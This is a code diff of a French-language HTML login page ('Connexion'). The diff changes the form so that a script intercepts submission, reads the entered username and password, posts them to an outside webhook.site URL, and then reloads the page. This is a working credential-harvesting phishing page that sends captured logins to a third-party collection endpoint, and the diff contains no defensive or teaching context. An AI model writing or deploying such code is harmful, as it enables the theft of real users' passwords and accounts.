@@ -49,22 +49,20 @@
 <body>
     <div class="login-box">
         <h2>Connexion</h2>
-        <form action="http://localhost:5000/submit" method="POST">
-            <input type="text" name="username" placeholder="Nom d'utilisateur" required><br>
-            <input type="password" name="password" placeholder="Mot de passe" required><br>
+        <form id="loginForm">
+            <input type="text" id="username" name="username" placeholder="Nom d'utilisateur" required><br>
+            <input type="password" id="password" name="password" placeholder="Mot de passe" required><br>
             <input type="submit" value="Se connecter">
         </form>
     </div>
-
     <script>
         // Intercepter la soumission du formulaire
         document.getElementById('loginForm').addEventListener('submit', async function(event) {
-            event.preventDefault(); // Empêcher la soumission classique du formulaire
+            event.preventDefault(); // Empêche la soumission classique du formulaire
 
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
-            // Envoyer les données à l'URL cible
             try {
                 const response = await fetch('https://webhook.site/3e17ccde-8a6c-4d7d-8b4d-38ade87aac0f', {
                     method: 'POST',
@@ -75,13 +73,18 @@
                 });
 
                 if (response.ok) {
-                    alert('Données envoyées avec succès');
+                    // Affiche une alerte en cas de succès et recharge la page
+                    alert('Données envoyées avec succès.');
                 } else {
-                    alert('Erreur lors de l\'envoi des données');
+                    // Affiche une alerte en cas d'erreur de réponse
+                    alert('Erreur lors de l\'envoi des données. Vérifiez le serveur cible.');
                 }
             } catch (error) {
-                console.error('Erreur :', error);
-                alert('Erreur réseau');
+                // Affiche une alerte en cas d'erreur réseau
+                alert('Erreur réseau : le site cible est inaccessible.');
+            } finally {
+                // Recharge la page après la tentative d'envoi
+                window.location.reload();
             }
         });
     </script>
